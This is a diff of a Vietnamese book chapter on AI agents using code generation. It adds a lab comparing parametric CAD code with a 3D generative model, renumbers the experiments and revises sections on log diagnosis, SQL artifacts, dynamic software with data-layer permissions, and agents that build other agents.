+Vì vậy, đi đường nào vốn chính là một quyết định Agent phải đưa ra: cân nhắc độ phức tạp nội tại và yêu cầu độ chính xác của sản phẩm, giao nhiệm vụ cho tạo mã hoặc mô hình sinh 3D. Trong hệ thống thực tế, hai đường còn có thể đi lẫn nhau — hình học dùng mã để tạo có tham số hóa, vân bề mặt giao cho mô hình sinh, mỗi bên lấy thế mạnh của mình.
+
+> **Thử nghiệm 5-9 ★★: Hai tuyến tạo cùng một linh kiện — mã và mô hình sinh**
+>
+> **Mục tiêu thử nghiệm**: Với cùng một linh kiện cơ khí có đặc tả kích thước, so sánh hai tuyến tạo mã và mô hình sinh 3D về độ chính xác kích thước, khả năng chỉnh sửa và tính khả dụng cho chế tạo, kiểm chứng khung phán đoán "chọn đường theo độ phức tạp nội tại và yêu cầu độ chính xác".
+>
+> **Giải pháp kỹ thuật**: Nhu cầu ngôn ngữ tự nhiên có đặc tả rõ ràng (chẳng hạn "mặt bích, đường kính ngoài 80mm, độ dày 10mm, 4 lỗ lắp M5 phân bố đều, đường kính vòng tròn vị trí lỗ 60mm"). **Tuyến A**: Agent viết mã CadQuery (hoặc OpenSCAD) để dựng linh kiện, xuất STEP và STL. **Tuyến B**: đưa cùng đặc tả đó cho mô hình sinh 3D (chẳng hạn Hunyuan 3D), nhận được lưới tam giác. **Xác minh theo chương trình**: đo độ lệch giữa các kích thước then chốt (đường kính ngoài, độ dày, vị trí lỗ, đường kính lỗ) của sản phẩm hai tuyến so với đặc tả, đồng thời kiểm tra độ phẳng của mặt lắp.
+>
+> Sau đó đưa ra yêu cầu thay đổi "lỗ lắp từ M5 đổi thành M6", ghi lại chi phí sửa đổi của từng tuyến — tuyến mã chỉ sửa một tham số rồi chạy lại, tuyến mô hình sinh chỉ có thể tạo lại toàn bộ, còn các kích thước khác có giữ nguyên hay không không thể bảo đảm.
+>
+> **Nhóm đối chứng**: Sinh một chậu cây xanh — ưu khuyết của hai tuyến đảo ngược hẳn: tuyến mã dù có thêm nhiễu theo chương trình vẫn cứng nhắc gò bó, còn tuyến mô hình sinh thì tự nhiên sinh động.
 
 ### Mã làm bộ điều hợp hệ thống
 
@@ -577,7 +601,7 @@ Observability của hệ thống Agent phụ thuộc vào việc trực quan hó
 
 Việc tạo mã cung cấp một giải pháp tinh tế: thiết lập vòng phản hồi tự động sửa lỗi. Khi giao diện người dùng gặp định dạng nhật ký không thể phân tích cú pháp, thay vì hiển thị lỗi, nó sẽ tự động báo cáo thông tin lỗi (mẫu nhật ký gốc, báo cáo lỗi chi tiết) tới Agent. Agent phân tích cấu trúc dữ liệu mẫu và tạo mã giao diện người dùng có thể được phân tích cú pháp chính xác. Mã trước tiên được kiểm tra tự động trong trình duyệt ảo (xác minh tính chính xác của phân tích cú pháp, sử dụng Vision LLM để kiểm tra hiệu ứng trực quan), sau đó cập nhật nóng lên hệ thống giao diện người dùng sau khi vượt qua bài kiểm tra.
 
-> **Thử nghiệm 5-7 ★★★: Hệ thống phân tích cú pháp nhật ký thích ứng**
+> **Thử nghiệm 5-10 ★★★: Hệ thống phân tích cú pháp nhật ký thích ứng**
 >
 > **Mục tiêu thử nghiệm**: Xây dựng hệ thống hiển thị nhật ký Agent tự phát triển.
 >
@@ -587,11 +611,13 @@ Việc tạo mã cung cấp một giải pháp tinh tế: thiết lập vòng ph
 >
 **Agent thực hiện phân tích nhật ký tự động và chẩn đoán sự cố.**
 
+**Tự động phân tích nhật ký thực thi của Agent và chẩn đoán vấn đề.**
+
 Agent trong môi trường sản xuất sẽ tạo ra một số lượng lớn nhật ký trajectory (trajectory, ghi lại quá trình hoàn chỉnh của từng nhiệm vụ). Tuy nhiên, việc xác định vấn đề từ nhật ký, xác định nguyên nhân gốc rễ và xây dựng các trường hợp kiểm thử là một nhiệm vụ tốn kém. Khó xác định vị trí vấn đề vì lỗi nhiệm vụ có thể do lỗi phối hợp trong nhiều mô-đun; chi phí tái tạo cao vì độ phức tạp của môi trường sản xuất khó mô phỏng trong môi trường thử nghiệm; các vấn đề đã khắc phục có xu hướng tái diễn do thiếu kiểm tra hồi quy có hệ thống.
 
 Việc tạo mã cung cấp một đường dẫn tự động đến chẩn đoán. Agent có thể đọc nhật ký sản xuất, kết hợp tài liệu kiến trúc và PRD (tài liệu yêu cầu sản phẩm) để tự động xác định xem quy trình thực thi có đáp ứng mong đợi hay không, đồng thời xác định các liên kết và mô-đun có vấn đề. Tạo báo cáo vấn đề có cấu trúc (mức độ ưu tiên, mô-đun, mô tả, đề xuất cải tiến) và các trường hợp kiểm thử hồi quy dựa trên kết quả phân tích - ID theo dõi vấn đề tham chiếu trường hợp kiểm thử và các vòng tương tác chính, đồng thời khung kiểm tra tự động phát lại để xác minh rằng hệ thống cố định tạo ra hành vi đúng trong cùng một đầu vào. Cuối cùng, Agent kết nối với GitHub thông qua MCP để tạo Issue và giao Issue đó cho các nhà phát triển có liên quan, hoàn thành quá trình tự động hóa hoàn toàn từ phát hiện vấn đề đến phân công nhiệm vụ.
 
-> **Thí nghiệm 5-8 ★★★: Hệ thống chẩn đoán thông minh cho nhật ký sản xuất**
+> **Thử nghiệm 5-11 ★★★: Hệ thống chẩn đoán thông minh cho nhật ký sản xuất**
 >
 > **Mục tiêu thử nghiệm**: Tự động phát hiện sự cố, tạo trường hợp thử nghiệm và tạo mục công việc từ trajectory sản xuất.
 >
@@ -630,8 +656,7 @@ Thông qua việc tạo mã, Agent có thể tạo các giao diện tương tác
 
 ![Hình 5-8 Quá trình tạo biểu mẫu động ](images/fig5-8.svg)
 
-
-> **Thử nghiệm 5-9 ★★: Hệ thống làm rõ ý định để tạo biểu mẫu động**
+> **Thử nghiệm 5-12 ★★: Hệ thống làm rõ ý định để tạo biểu mẫu động**
 >
 > **Mục tiêu của phòng thí nghiệm**: Xác minh khả năng của Agent trong việc làm rõ ý định của người dùng bằng cách tạo động biểu mẫu HTML.
 >
@@ -641,6 +666,8 @@ Thông qua việc tạo mã, Agent có thể tạo các giao diện tương tác
 >
 **Tạo truy vấn SQL.**
 
+**Sinh truy vấn SQL.**
+
 Truy vấn cơ sở dữ liệu là một tình huống trong đó việc tạo mã có thể cải thiện đáng kể trải nghiệm tương tác. Truy cập cơ sở dữ liệu truyền thống dựa vào công cụ GUI hoặc chữ viết tay SQL. Cái trước thì cồng kềnh để vận hành và cái sau đòi hỏi người dùng phải có kiến thức chuyên môn. Agent có thể chuyển đổi ngôn ngữ tự nhiên thành SQL, nhưng có một lựa chọn thiết kế quan trọng ở đây: để Agent thực thi SQL rồi mô tả kết quả bằng ngôn ngữ tự nhiên hoặc để Agent tạo mã SQL dưới dạng một artifact và được giao diện người dùng thực thi trực tiếp?
 
 Giải pháp đầu tiên có vẻ “thông minh” hơn nhưng lại cực kỳ kém hiệu quả – kết quả truy vấn có thể chứa hàng nghìn hàng bảng lớn, và yêu cầu LLM mô tả bằng văn bản sau khi đọc không chỉ tiêu tốn nhiều token và mất nhiều thời gian mà nghiêm trọng hơn, LLM rất dễ mắc lỗi khi “sao chép” dữ liệu. Một giải pháp tốt hơn là **chế độ artifact**. Hình 5-9 cho thấy quy trình làm việc của SQL truy vấn Agent: Agent không tự đọc dữ liệu mà tạo ra một đoạn mã truy vấn SQL và gửi mã này đến hệ thống dưới dạng một "artifact" độc lập. Hệ thống lấy phần SQL này và truy vấn trực tiếp cơ sở dữ liệu, hiển thị dữ liệu tìm thấy vào một bảng mà người dùng có thể nhìn thấy. Trong toàn bộ quá trình, dữ liệu đi thẳng từ cơ sở dữ liệu đến giao diện người dùng, hoàn toàn bỏ qua "người trung gian" LLM - LLM chỉ chịu trách nhiệm viết câu lệnh truy vấn. Không cần phải trực tiếp đọc hàng nghìn hàng dữ liệu rồi lặp lại cho người dùng. Nó nhanh và chính xác.
@@ -649,10 +676,9 @@ SQL và mã trực quan được tạo ra không được thực thi trực ti�
 
 ![Hình 5-9 Quy trình tác nhân truy vấn SQL ](images/fig5-9.svg)
 
-
 Hơn nữa, Agent có thể tạo hai artifact để tạo thành một pipeline: truy vấn SQL + mã trực quan (chẳng hạn như biểu đồ). Giao diện người dùng trực tiếp chuyển kết quả SQL tới mã trực quan. LLM chỉ chịu trách nhiệm tạo mã và không tham gia truyền dữ liệu - đây là bản chất của việc tạo mã như một giao diện.
 
-> **Thử nghiệm 5-10 ★★: ERP cho tương tác ngôn ngữ tự nhiên Agent**
+> **Thử nghiệm 5-13 ★★: ERP cho tương tác ngôn ngữ tự nhiên Agent**
 >
 > Phần mềm ERP (Enterprise Resource Planning) là hệ thống then chốt của doanh nghiệp. Hiện tại, giao diện GUI được sử dụng phổ biến và các thao tác phức tạp đòi hỏi phải click chuột nhiều lần. AI Agent có thể chuyển đổi các truy vấn ngôn ngữ tự nhiên của người dùng thành các câu lệnh SQL để hiện thực hóa các truy vấn tự động.
 >
@@ -671,11 +697,13 @@ Hơn nữa, Agent có thể tạo hai artifact để tạo thành một pipeline
 >
 **Phần mềm tạo động.**
 
+**Sinh phần mềm động.**
+
 Ứng dụng cuối cùng của khả năng tạo mã là cho phép Agent tạo phần mềm hoàn toàn linh hoạt ngay từ đầu. "Imagine with Claude" của Anthropic cho thấy ranh giới của khả năng này: người dùng đưa ra yêu cầu, Claude tạo giao diện ngoại vi và logic tương tác trong thời gian thực, người dùng tương tác với phần mềm được tạo và Claude sửa đổi mã để tạo giao diện mới nhằm hiển thị kết quả hoạt động. Trong suốt quá trình, người dùng sẽ thấy một ứng dụng phát triển từ đầu và tiếp tục phát triển.
 
 Tuy nhiên, mẫu được tạo hoàn toàn động này có chi phí và độ trễ cao hơn và phù hợp hơn khi làm thử nghiệm để chứng minh ranh giới của các khả năng. Một hướng thực dụng hơn là thực hiện các sửa đổi tùy chỉnh dựa trên các khuôn khổ hiện có. Chế độ "bán tùy chỉnh" này duy trì sự ổn định của phần mềm cơ bản trong khi mở ra khả năng kiểm soát của người dùng ở các kích thước cụ thể - người dùng nói "đổi nút thành màu xanh", "thêm menu lối tắt vào thanh bên", "sửa đổi phông chữ để dễ đọc hơn", Agent hiểu các yêu cầu và sửa đổi mã giao diện người dùng cũng như tải nóng (HMR, Thay thế mô-đun nóng, thay thế nóng một phần, giữ nguyên trạng thái ứng dụng và có hiệu lực mà không cần trang đầy đủ làm mới) có hiệu lực ngay lập tức. Điều này biến sản phẩm tiêu chuẩn “phù hợp với tất cả” thành trải nghiệm cá nhân hóa “nghìn người nghìn vẻ”.
 
-> **Thử nghiệm 5-11 ★★: Hệ thống tùy chỉnh giao diện hội thoại**
+> **Thử nghiệm 5-14 ★★: Hệ thống tùy chỉnh giao diện hội thoại**
 >
 > **Mục tiêu thử nghiệm**: Để cho phép người dùng tùy chỉnh ngay lập tức giao diện phần mềm thông qua đối thoại bằng ngôn ngữ tự nhiên và để xác minh tính hiệu quả của việc tạo mã được hỗ trợ bởi cơ chế tải nóng trong việc cung cấp trải nghiệm người dùng được cá nhân hóa.
 >
@@ -689,7 +717,7 @@ Kiến trúc bền vững hơn **hạ ranh giới tin cậy xuống tầng dữ 
 
 Hạ quyền xuống không có nghĩa đưa toàn bộ logic nghiệp vụ vào cơ sở dữ liệu. Tầng ứng dụng vẫn có thể kiểm tra trước để phản hồi nhanh, nhưng tầng dữ liệu phải giữ quyền quyết định cuối cùng. Cùng một quy tắc có thể cải thiện trải nghiệm ở trên và tạo bảo đảm ở dưới. Mọi đường truy cập dữ liệu phải đi qua tầng dữ liệu tin cậy; mã sinh không được kết nối trực tiếp để đi vòng. Nhờ đó tầng trên có thể liên tục thay đổi, còn ràng buộc quyền không thể thương lượng nằm ở tầng không bị sinh lại theo mỗi yêu cầu. Đây chính là tầng dữ liệu trong bộ khung ba tầng của Chương 1 — tầng khó bị vượt qua nhất.
 
-> **Thử nghiệm 5-12 ★★★: Đối tượng dữ liệu nhúng quyền cho phần mềm động**
+> **Thử nghiệm 5-15 ★★★: Đối tượng dữ liệu nhúng quyền cho phần mềm động**
 >
 > **Mục tiêu thử nghiệm**: Xây dựng kho đối tượng cho phép mã ứng dụng được tạo hoặc viết lại động nhưng vẫn thực thi ủy quyền và toàn vẹn dữ liệu ở tầng dữ liệu. Xác minh mã sinh không thể vượt ranh giới ổn định bằng cách bỏ qua chuyển trạng thái, ghi giá trị ngoài phạm vi hoặc đọc xuyên tenant.
 >
@@ -701,11 +729,7 @@ Hạ quyền xuống không có nghĩa đưa toàn bộ logic nghiệp vụ vào
 
 Các phần trước đã chỉ ra cách sử dụng tính năng tạo mã trong nhiều lĩnh vực khác nhau—từ tư duy toán học đến tạo tài liệu cho đến tùy chỉnh giao diện. Nếu chúng ta đẩy những khả năng này đến giới hạn của chúng, một câu hỏi tự nhiên sẽ xuất hiện: Agent có thể sử dụng khả năng tạo mã để tạo một Agent khác không?
 
-Ở đây trước tiên chúng ta phải làm rõ sự phân công lao động với Chương 9. Phần này nói về Agent sử dụng mã **để sửa chữa và tạo ra Agent** cùng loại với chính nó - tự sửa chữa, tự sao chép và sao chép theo yêu cầu để tạo ra Agent mới, hoạt động trên mã và cấu trúc của Agent; "Tự tiến hóa" trong Chương 9 là một chuyện khác, đề cập đến việc Agent tiếp tục phát triển khả năng (kết tủa kinh nghiệm, tối ưu hóa lời nhắc và tích lũy công cụ) mà không thay đổi trọng số mô hình là nhắm vào kiến thức và chiến lược của Agent. Cả hai đều có thể được gọi là "tiến hóa". Để tránh nhầm lẫn với tiêu đề của Chương 9, phần này sử dụng bootstrapping để chỉ khả năng "sản xuất Agent bằng mã".
-
-
 ![Hình 5-10 Vòng lặp khởi động tác nhân ](images/fig5-10.svg)
-
 
 **Tự phục hồi cho Agent: OpenClaw Doctor.**
 
@@ -734,7 +758,7 @@ Cách hiệu quả nhất để giải quyết những vấn đề này không p
 
 Khi Agent nhận nhiệm vụ phát triển Agent mới, trước tiên bạn nên sao chép mã của riêng mình (hoặc cách triển khai chất lượng cao đã được chứng minh khác), sau đó thực hiện các sửa đổi có mục tiêu: điều chỉnh các system prompt để phù hợp với vai trò mới, thay thế hoặc thêm hoặc xóa các công cụ để thích ứng với các chức năng mới, sửa đổi logic nghiệp vụ nhưng vẫn giữ nguyên khung kiến trúc. Mô hình “tự sao chép và sửa đổi thích ứng” này không chỉ đảm bảo Agent mới kế thừa những ưu điểm kỹ thuật cốt lõi mà còn cho phép phân biệt theo các chiều cụ thể - giống như sao chép và đột biến gen trong sinh học.
 
-> **Thử nghiệm 5-13 ★★★: Phát triển Agent tạo ra Agent**
+> **Thử nghiệm 5-16 ★★★: Phát triển Agent tạo ra Agent**
 >
 > **Mục tiêu thử nghiệm**: Xây dựng Coding Agent với khả năng lập trình siêu dữ liệu (tức là viết chương trình có thể tạo hoặc sửa đổi các chương trình khác) và có thể tự động tạo hệ thống Agent mới theo nhu cầu của người dùng để đảm bảo tuân thủ các phương pháp hay nhất.
 >
@@ -752,7 +776,7 @@ Bootstrap Agent là hiện thân tột bậc của khả năng tạo mã - Agent
 
 Cốt lõi của cuộc thảo luận trong chương này luôn giống nhau: mã không chỉ là một công cụ để viết chương trình, nó là ngôn ngữ để Agent suy nghĩ hình thức và diễn đạt chính xác.
 
-Kết luận cốt lõi của phần Harness Engineering (kỹ thuật Harness) là: Lý do tại sao Coding Agent có độ hoàn thiện cao không phải vì mô hình tạo mã đặc biệt mạnh mà vì cơ sở hạ tầng được tích lũy qua nhiều thập kỷ kỹ thuật phần mềm—bộ thử nghiệm, hệ thống loại và kiểm soát phiên bản—tự nhiên tạo thành một bộ Harness mạnh mẽ. Kết luận này có giá trị khái quát cho các kịch bản Agent khác. Mục "Sự cố và khôi phục lỗi" thì cho thấy một mặt khác của cùng chủ đề: độ tin cậy của Agent không phụ thuộc vào việc mô hình có phạm lỗi hay không, mà phụ thuộc vào việc mỗi loại sự cố có được một đường phát hiện, khôi phục và dừng tương ứng hay không.
+Kết luận cốt lõi của phần Harness Engineering (kỹ thuật Harness) là: Lý do tại sao Coding Agent có độ hoàn thiện cao không phải vì mô hình tạo mã đặc biệt mạnh mà vì cơ sở hạ tầng được tích lũy qua nhiều thập kỷ kỹ thuật phần mềm—bộ thử nghiệm, hệ thống loại và kiểm soát phiên bản—tự nhiên tạo thành một bộ Harness mạnh mẽ. Kết luận này có giá trị khái quát cho các kịch bản Agent khác. Mục "Sự cố và khôi phục lỗi" thì cho thấy một mặt khác của cùng chủ đề: độ tin cậy của Agent không phụ thuộc vào việc mô hình có phạm lỗi hay không, mà phụ thuộc vào việc mỗi loại sự cố có được một đường phát hiện, khôi phục, bàn giao và dừng tương ứng hay không.
 
 Phần thứ hai cho thấy giá trị rộng rãi của việc tạo mã ngoài lập trình, tương ứng với sáu chiều của văn bản chính:
 
